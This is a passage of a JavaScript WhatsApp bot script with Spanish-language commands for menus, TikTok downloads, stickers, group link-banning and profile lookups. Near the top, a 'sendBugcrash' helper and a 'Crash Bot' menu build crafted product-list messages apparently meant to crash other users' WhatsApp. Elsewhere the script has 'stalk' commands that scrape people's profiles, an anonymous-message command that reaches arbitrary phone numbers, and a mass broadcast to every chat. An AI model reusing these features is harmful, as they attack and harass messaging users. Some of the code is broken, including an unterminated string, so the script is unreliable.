        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : troli })
return Panda.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}

async function replyprem(teks) {
    let buttons = [
    { buttonId: '.buypremium', buttonText: { displayText: '💳𝑪𝒐𝒎𝒑𝒓𝒂𝒓 𝒑𝒓𝒆𝒎𝒊𝒖𝒎' }, type: 1 }
    ]
    return Panda.sendButtonText(m.chat, buttons, teks, `Eres tacaño de no comprar`, m)
}

if (/hehe/g.test(m.body)) {
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
Panda.relayMessage(m.chat, { reactionMessage }, { messageId: "ppppp" })
}

if (autodltt) {
if (/(?:http(?:s|):\/\/|)(?:www\.|)(?:tiktok.com)\/@([-_0-9A-Za-z\.]{3,20})\/video\/([0-9]{19,25})?.(?:sender_device=pc&sender_web_id=[0-9]{19,25})&.(?:s_from_webapp=v1&is_copy_url=[0-9]{1})|(?:http(?:s|)):\/\/(?:(?:vt.|vm.)tiktok.com)\/(?:[a-z0-9A-Z]{9,15}\/)|(?:http(?:s|)):\/\/(?:t.tiktok.com)\/(?:i18n\/share\/video)\/([&\?\/a-zA-Z0-9=_-]{333,400})/.test(body) && !body.startsWith(prefix)) {
url = body.match(/(?:http(?:s|):\/\/|)(?:www\.|)(?:tiktok.com)\/@([-_0-9A-Za-z\.]{3,20})\/video\/([0-9]{19,25})?.(?:sender_device=pc&sender_web_id=[0-9]{19,25})&.(?:s_from_webapp=v1&is_copy_url=[0-9]{1})|(?:http(?:s|)):\/\/(?:(?:vt.|vm.)tiktok.com)\/(?:[a-z0-9A-Z]{9,15}\/)|(?:http(?:s|)):\/\/(?:t.tiktok.com)\/(?:i18n\/share\/video)\/([&\?\/a-zA-Z0-9=_-]{333,400})/)[0] 
let atdl = await tiktokdl(url)
let buttons = [
{ buttonId: `.tiktokvideo ${url}`, buttonText: { displayText: 'Video' }, type: 1 },
{ buttonId: `.tiktokaudio ${url}`, buttonText: { displayText: 'Audio' }, type: 1 }
]
await Panda.sendButtonText(m.chat, buttons, ` 『 𝑨𝒖𝒕𝒐𝒅𝒆𝒔𝒄𝒂𝒓𝒈𝒂𝒔 𝑻𝒊𝒌𝒕𝒐𝒌 』\n\n𝑻𝒊𝒕𝒖𝒍𝒐 : ${atdl.title}`, `𝑨𝒉𝒐𝒓𝒂 𝒕𝒐𝒅𝒐 𝒔𝒆 𝒅𝒆𝒔𝒄𝒂𝒓𝒈𝒂 𝒂𝒖𝒕𝒐𝒎𝒂𝒕𝒊𝒄𝒐`, ftext)
}
}

if (autosticker) {
if (/image/.test(mime) && !/webp/.test(mime)) {
let media = await quoted.download()
let encmedia = await Panda.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime) && !/webp/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximo 10 segundos!')
let media = await quoted.download()
let encmedia = await Panda.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
}

if (m.isGroup && !m.key.fromMe && !itsMePanda && antilink) {
if (!isBotAdmins) return
if (budy.match(`chat.whatsapp.com`)) {
Panda.sendMessage(m.chat, {text: `『 𝑬𝒏𝒍𝒂𝒄𝒆 𝑫𝒆𝒕𝒆𝒄𝒕𝒂𝒅𝒐 』\n\nEl Grupo es antienlaces\n\nSeras eliminado ${groupMetadata.subject}`}, {quoted:m})
Panda.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (m.isGroup && !m.key.fromMe && !itsMePanda && antiwame) {
if (!isBotAdmins) return
if (budy.match(`wa.me`)) {
Panda.sendMessage(m.chat, {text: `『 𝑬𝒏𝒍𝒂𝒄𝒆 𝑾𝒂.𝒎𝒆 』\n\nEl Grupo es antiwa.me\n\nSeras eliminado ${groupMetadata.subject}`}, {quoted:m})
Panda.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (m.isGroup && !m.key.fromMe && !itsMePanda && antinstack) {
if (!isBotAdmins) return
if (budy.match(`instagram.com`)) {
Panda.sendMessage(m.chat, {text: `『 Link Instagram detectado 』\n\nEl Grupo es antinstack\n\nSeras eliminado ${groupMetadata.subject}`}, {quoted:m})
Panda.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (m.isGroup && !m.key.fromMe && !itsMePanda && antifacebook) {
if (!isBotAdmins) return
if (budy.match(`facebook.com`)) {
Panda.sendMessage(m.chat, {text: `『 Link Facebook detectado 』\n\nEl Grupo es antifacebook\n\nSeras eliminado ${groupMetadata.subject}`}, {quoted:m})
Panda.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
Panda.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
Panda.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

const nebal = (angka) => {
return Math.floor(angka)
}

if (!isCmd && isAlreadyPandaList(chath, dblist)) {
var getkaydata = getDataPandaList(chath, dblist)
if (getkaydata.isImage === false) {
Panda.sendMessage(m.chat, { text: sendPandaList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getkaydata.image_url)
Panda.sendImage(m.chat, buff, `${getkaydata.response}`, m)
}
}

const seactions = [{
title: `𝑺𝒆𝒍𝒆𝒄𝒄𝒊𝒐𝒏𝒂 𝒖𝒏𝒂 𝒐𝒑𝒄𝒊𝒐𝒏`,
rows: [
{title: `⊟ 𝐌𝐞𝐧𝐮 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐨`, rowId: `${prefix}allmenu`},
{title: `⊟ 𝐌𝐞𝐧𝐮 𝐂𝐫𝐞𝐚𝐝𝐨𝐫`, rowId: `${prefix}ownermenu`},
{title: `⊟ 𝐎𝐭𝐫𝐨𝐬 𝐦𝐞𝐧𝐮`, rowId: `${prefix}othermenu`},
{title: `⊟ 𝐌𝐞𝐧𝐮 𝐝𝐞 𝐃𝐞𝐬𝐜𝐚𝐫𝐠𝐚𝐬`, rowId: `${prefix}downloadmenu`},
{title: `⊟ 𝐌𝐞𝐧𝐮 𝐂𝐫𝐚𝐬𝐡 𝐁𝐨𝐭`, rowId: `${prefix}bugmenu`},
{title: `⊟ 𝐌𝐞𝐧𝐮 𝐏𝐚𝐫𝐚 𝐆𝐫𝐮𝐩𝐨𝐬`, rowId: `${prefix}groupmenu`},
{title: `⊟ 𝐌𝐞𝐧𝐮 𝐃𝐢𝐯𝐞𝐫𝐬𝐢𝐨𝐧`, rowId: `${prefix}funmenu`},
{title: `⊟ 𝐌𝐞𝐧𝐮 𝐒𝐭𝐚𝐥𝐤𝐞𝐚𝐫`, rowId: `${prefix}stalkermenu`},
{title: `⊟ 𝐌𝐞𝐧𝐮 𝐋𝐎𝐆𝐎`, rowId: `${prefix}randfotomenu`},
{title: `⊟ 𝐌𝐞𝐧𝐮 𝐕𝐢𝐝𝐞𝐨`, rowId: `${prefix}randvideomenu`},
{title: `⊟ 𝐌𝐞𝐧𝐮 𝐋𝐨𝐠𝐨 𝐓𝐞𝐱𝐭𝐨`, rowId: `${prefix}textpromenu`},
{title: `⊟ 𝐌𝐞𝐧𝐮 𝐋𝐨𝐠𝐨 𝟑𝐃`, rowId: `${prefix}photooxymenu`},
{title: `⊟ 𝐌𝐞𝐧𝐮 𝐋𝐨𝐠𝐨 𝟑𝟔𝟎`, rowId: `${prefix}ephoto360menu`},
]}]
const listMenuMessage = { 
text: `Hola @${sender.split("@")[0]} Estos son mis comandos`,
mentions: [sender],
footer: fake,
buttonText: '𝐋𝐢𝐬𝐭𝐚 𝐝𝐞 𝐦𝐞𝐧𝐮',
sections: seactions,
listType: 1}
switch (command) {

case 'jadibot': {
if (m.isGroup) return reply(mess.private)
if (!isPrem) return replyprem(mess.premium)
jadibot(kayla, m, from)
}
break
case 'listjadibot': 
try {
let user = [... new Set([...global.conns.filter(kayla => kayla.user).map(kayla => kayla.user)])]
te = "*Lista Jadibot*\n\n"
for (let i of user){
y = await kayla.decodeJid(i.id)
te += " × Usuario: @" + y.split("@")[0] + "\n"
te += " × Nombre : " + i.name + "\n\n"
}
kayla.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
reply(`Aun Nadie se a conectado a Jadibot`)
}
break

case 'shutdown':
if (!itsMePanda) return reply(mess.owner)
reply(`Bye...`)
await sleep(3000)
process.exit()
break
case 'owner': {
const repf = await Panda.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contacto`, 
contacts: list }, mentions: [sender] }, { quoted: m })
Panda.sendMessage(from, { text : `Hola@${sender.split("@")[0]}, Solo escribele para emergencias`, mentions: [sender]}, { quoted: repf })
}
break
case 'menu':{
const tyds = await Panda.sendMessage(from, buttonLocnya, { quoted : m })
Panda.sendMessage(from, listMenuMessage, { quoted: tyds })
}
break
case 'allmenu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${allmenu(prefix, hituet)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})
break
case 'ownermenu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${ownermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})
break
case 'othermenu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${othermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})
break
case 'downloadmenu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${downloadmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})
break
case 'bugmenu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${bugmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})
break
case 'groupmenu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${groupmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})
break
case 'funmenu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${funmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})
break
case 'stalkermenu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${stalkermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})
break
case 'randfotomenu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${randfotomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})
break
case 'randvideomenu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${randvideomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})
break
case 'textpromenu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${textpromenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})
break
case 'photooxymenu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${photooxymenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})
break
case 'ephoto360menu':
sendPandaMessage(from, { 
text: `Hola @${sender.split("@")[0]}\n\n${ephoto360menu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}
}
})

break
case 'caridoi':
case 'cariteman':
if (!isPrem) return replyprem(mess.premium)
let teman = pickRandom(pendaftar)
setTimeout(() => {
reply('Está buscando...)
}, 1000)
setTimeout(() => {
reply('Logró conseguir una persona')
}, 5000)
setTimeout(() => {
Panda.sendMessage(from, {text: `Que opinas @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
break
case 'sc': case 'scriptbot': case 'scbot':{
Panda.sendMessage(m.chat,{text:`Mau Script Bot Nya? Silahkan Chat Aja @${creator.split("@")[0]}`,mentions: [creator], },{quoted:m})
}
break

case 'instalarbot': case 'instalar':{
Panda.sendMessage(m.chat,{text:`Instalar bot\n\nEl Scrip aun no esta terminado escribe al por dudas @${creator.split("@")[0]}\n\n\n$ termux-setup-storage\n$ apt update\n$ pkg upgrade\n$ pkg install git -y\n\n$ pkg install nodejs -y\n$ pkg install ffmpeg -y\n$ pkg install imagemagick -y\n$ pkg install yarn\n$ git clone https://github.com/BlackPandaModsyMas/BlackPanda-Boot-MD\n$ cd BlackPanda-Boot-MD\n$ yarn install\n$ npm install\n$ npm update\n$ npm start`,mentions: [creator], },{quoted:m})
}
break

case 'q': case 'quoted': {
if (!m.quoted) return reply('¡Responde el mensaje!!')
let wokwol = await Panda.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return reply('El mensaje que está respondiendo no contiene una respuesta.')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
case 'es': case 'español':
if (!q) return reply(` El comando es : ${prefix+command} Yo amo a cheryl`)
reply(mess.wait)
const gtts = require('./lib/gtts')(`es`, q)
var bby = args.join(' ')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('Teks nya terlalu panjang kak')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
Panda.sendMessage(m.chat,{audio:buff, mimetype: "audio/mp4", ptt:false},{quoted:m})
fs.unlinkSync(rano)
})
})
break

case 'arabe': case 'ar':
if (!q) return reply(` El comando es : ${prefix+command} Yo amo a cheryl`)
reply(mess.wait)
const ar = require('./lib/ar')(`ar`, q)
var bby = args.join(' ')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('el texto es muy largo')
: ar.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
Panda.sendMessage(m.chat,{audio:buff, mimetype: "audio/mp4", ptt:false},{quoted:m})
fs.unlinkSync(rano)
})
})

break
case 'igstalk':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`comando ${prefix+command} blackpandabot`)
reply(mess.wait)
aj = await igstalk(`${q}`)
Panda.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Stalkeando bot \\*

Nombre : ${aj.fullname}
Usuario : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case 'ffstalk':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Comando ${prefix+command} 2348838333`)
reply(mess.wait)
eeh = await ffstalk.ffstalk(`${q}`)
reply(`*/ Stalkeando Freefire \\*

Id : ${eeh.id}
Usuario : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Comando ${prefix+command} 530793138|8129`)
reply(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
reply(`*/ Stalkeando Mobile Legengd \\*

Username ${dat.userName}
Id : ${q.split("|")[0]}
Zoneid : ${q.split("|")[1]}`)
}
break
case 'npmstalk':{
if (!q) return reply(`Comandl ${prefix+command} panda-api`)
reply(mess.wait)
eha = await npmstalk.npmstalk(q)
reply(`*/ Stalkeando Npm \\*

Nama : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ghstalk':{
if (!q) return reply(`Comando ${prefix+command} BlackPanda`)
reply(mess.wait)
aj = await githubstalk.githubstalk(`${q}`)
Panda.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Stalkeando Github \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'ss': case 'ssweb':{
if (!q) return reply(`Comando ${prefix+command} link`)
reply(mess.wait)
let krt = await scp1.ssweb(q)
Panda.sendMessage(m.chat,{image:krt.result,caption:mess.succes},{quoted:m})
}
break
case 'join': {
if (!itsMePanda) return reply(mess.owner)
if (!text) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalido')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Panda.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'toonce': { 
if (!quoted) return reply(`Reenvien imagen/Video`)
if (/image/.test(mime)) {
anuan = await Panda.downloadAndSaveMediaMessage(quoted)
Panda.sendMessage(m.chat, {image: {url:anuan}, caption: `Que opinas`, fileLength: "99999999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await Panda.downloadAndSaveMediaMessage(quoted)
Panda.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Que opinas`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'autodltt':
if (!itsMePanda) return reply(mess.owner)
if (args[0] == 'on') {
if (autodltt) return reply('Activado')
autodltt = true
reply('Auto descargas de tiktok activado')
} else if (args[0] == 'off') {
if (!autodltt) return reply('Desactivado')
autodltt = false
reply('Autodescargas de tiktok desactivado')
} else {
let buttons = [
{ buttonId: '.autodltt on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.autodltt off', buttonText: { displayText: 'Off' }, type: 1 }
]
await Panda.sendButtonText(m.chat, buttons, `Modo Auto Download Tiktok`, `Desactivado o Activado`, m)
}
break
case 'autosticker':
if (!itsMePanda) return reply(mess.owner)
if (args[0] == 'on') {
if (autosticker) return reply('*¡Activado!*')
autosticker = true
reply('*Etiqueta automática activada con éxito*')
} else if (args[0] == 'off') {
if (!autosticker) return reply('*Desactivado!*')
autosticker = false
reply('*Ah sido desactivado Autosticker*')
} else {
let buttons = [
{ buttonId: '.autosticker on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.autosticker off', buttonText: { displayText: 'Off' }, type: 1 }
]
await Panda.sendButtonText(m.chat, buttons, `Modo Autosticker`, `On o Off`, m)
}
break
case 'bc':
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`¿Su texto?`)
let anu = await store.chats.all().map(v => v.id)
for (let yoi of anu) {
Panda.sendMessage(yoi,{text:`INFORMACIÓN\nCrear bots de usuario

${q}`})
}
reply(`Succes`)
break
case 'ban':{
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Use ${prefix+command} add/del numero\nContacto ${prefix+command} add/del 56921700706`)
orgnye = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
let ceknye = await Panda.onWhatsApp(orgnye)
if (ceknye.length == 0) return reply(`Ingresa un número válido y registrado en WhatsApp!!!`)
const isBane = banUser ? banUser.includes(orgnye) : false
if (args[0] === "add") {
if (isBane) return reply('Usuario ha sido baneado')
Panda.updateBlockStatus(orgnye, 'block')
reply(`Baneo completado`)
} else if (args[0] === "del") {
if (!isBane) return reply('Usuario no baneado')
Panda.updateBlockStatus(orgnye, 'unblock')
reply(`Desbaneo completado`)
} else {
reply("Error")
}
}
break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
try {
listBloxk = []
teskd = ``
listnyd = 1
for (let i of banUser) {
teskd += `\n${listnyd++}. @${i.split("@")[0]}`
listBloxk.push({
title: "+" + i.split("@")[0], rowId: `block del ${i.split("@")[0]}`, description: "toque para desbloquear"})
}
teskd += `\n\ntoque el botón para desbloquear`
const sections = [
{
title: "Bloqueo total " + banUser.length,
rows: listBloxk
}
]

const listMessage = {
text: teskd,
footer: fake,
title: "     「 List Participants Blockeados 」",
buttonText: "List Blockeados",
mentions: await Panda.parseMention(teskd),
sections
}
Panda.sendMessage(from, listMessage, {quoted:m})
} catch {
reply("Ningún usuario ha sido bloqueado")
}
}
break
case 'asupan': case 'bocil': case 'rikagusriani':{
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
fdy = await fetchJson(`https://Panda-api.herokuapp.com/api/random/asupan/${command}?apikey=BlackPanda`)
Panda.sendMessage(m.chat, { video : { url: fdy.result.url }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'hentaivid': {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
Panda.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Categoria : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
case 'menfes': case 'confes':
if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("todavía estás en la habitación")
if (m.isGroup) return reply(mess.private)
if (args.length < 1) return reply(`Use ${prefix+command} numero|Mensaje\nContacto ${prefix+command} 56921700707|Hola Owner`)
if (text > 700) return reply(`Texto largo`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
pesan = q.split('|')[1]
let cekno = await Panda.onWhatsApp(num)
if (cekno.length == 0) return reply(`Ingresa un número válido y registrado en WhatsApp!!!!`)
if (num === m.sender) return reply(`¡¡No puedo confesarme a tu propio número!`)
if (num === botNumber) return reply(`¡No se puede Menfess al número de Bot!`)
var nomor = m.sender
let buttons = [
{ buttonId: '.leave', buttonText: { displayText: 'Biarin' }, type: 1 }
]
await Panda.sendButtonText(num, buttons, `Hola, soy un bot. Alguien te envió un mensaje\nUn amigo tuyo\n(Remitente secreto)\n\n-------------------------------------->\n\n💌 Mensaje : ${pesan}\n\n-------------------------------------->`, `REMITENTE SECRETO\n¿Quieres enviar un mensaje a tu novio/amigo/amigo/doi/ex?\n¿Pero no quiere saber quién lo envió??\nPuedes usar este bot\nEjemplo de uso: ${prefix+command} número|mensaje para ello\n\nEjemplo: ${prefix+command} 569217xxxxx|Gracias por el bot`, m)
await Panda.sendMessage(num, {text:`También puede responder al mensaje enviando un mensaje, si no desea responder, presione el botón de salir de arriba, gracias`}, { quoted : m })
lidt = `Mensaje enviado con exicto\n👤 de : wa.me/${nomor.split("@s.whatsapp.net")[0]}\n👥 a : wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}\n\n⬡──⬡─────────⬡──⬡\n\nContenido del mensaje : ${pesan}\n\n⬡──⬡─────────⬡──⬡`
var check = Object.values(anon.anonymous).find(p => p.state == "Espere")
if (!check) {
anon.createRoom(sender, num)
console.log("[ MENFES ] Creating room for: " + sender);
return reply(lidt)
}
break
case 'leave':{
if (m.isGroup && itsMePanda && command == "leave") return Panda.groupLeave(from)
if (m.isGroup) return reply("Solo funciona en chat privado")
var room = Object.values(anon.anonymous).find(p => p.check(sender))
if (!room) return reply("no estas en la habitacion")
reply("Bye...")
var other = room.other(sender)
delete anon.anonymous[room.id]
if (other != "") Panda.sendMessage(other, {
text: "Bye..."
})
if (command == "leave") break;
}
case 'afk': {
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(`contacto ${prefix+command} a dormir`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
m.reply(`${m.pushName} sekarang afk\nAlasan : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'antilink':
if (!m.isGroup) return reply(mess.group)
